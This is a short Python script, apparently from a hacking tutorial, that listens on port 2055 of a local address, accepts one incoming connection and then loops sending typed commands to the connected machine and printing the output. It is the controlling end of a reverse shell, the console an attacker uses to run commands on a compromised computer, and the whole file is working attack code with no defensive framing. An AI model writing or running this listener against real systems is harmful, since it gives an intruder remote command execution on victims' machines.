#!usr/bin/env python3
import socket
l_s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creating socket object -> refer to python socket documentation
l_s.setsockopt(socket.SOL_SOCKET,  socket.SO_REUSEADDR, 1) #reuse socket incase of connection drop
l_s.bind(("192.168.128.129",2055)) # look for connections to our local machine , over the port number (free)
l_s.listen(0)  #look for connections
print("[+] Waiting for Connections ")
con, address = l_s.accept()   #accept connection 
print("[+] Connection Established from "+str(address))

while True:
	command = input(">>")
	con.send(command.encode("utf-8"))
	result=con.recv(1024)
	print(result)

